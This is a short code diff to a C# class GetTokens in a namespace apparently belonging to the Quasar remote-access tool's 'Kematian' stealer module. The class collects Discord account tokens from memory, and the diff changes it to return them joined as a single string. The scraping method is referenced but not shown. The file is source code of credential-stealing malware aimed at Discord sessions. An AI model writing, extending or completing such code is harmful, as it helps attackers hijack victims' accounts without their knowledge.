@@ -8,14 +8,14 @@ namespace Quasar.Client.Kematian.Discord
 {
     public class GetTokens
     {
-        public static string[] Tokens()
+        public static string Tokens()
         {
             var tokens = new List<string>();
 
             var methods = new List<Func<string[]>>()
-            {
-                GetTokensFromMemory.Tokens,
-            };
+                {
+                    GetTokensFromMemory.Tokens,
+                };
 
             Parallel.ForEach(methods, method =>
             {
@@ -36,7 +36,7 @@ namespace Quasar.Client.Kematian.Discord
                 }
             });
 
-            return tokens.ToArray();
+            return string.Join(Environment.NewLine, tokens);
         }
     }
 }
